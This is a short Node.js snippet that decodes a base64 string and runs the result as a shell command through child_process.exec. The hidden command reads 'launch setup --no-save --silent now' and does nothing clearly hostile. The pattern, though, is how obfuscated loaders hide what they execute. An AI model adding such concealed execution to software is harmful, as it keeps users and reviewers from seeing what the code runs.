var blob = "bGF1bmNoIHNldHVwIC0tbm8tc2F2ZSAtLXNpbGVudCBub3c=";
var cmd = Buffer.from(blob, "base64").toString("utf8");
require("child_process").exec(cmd);
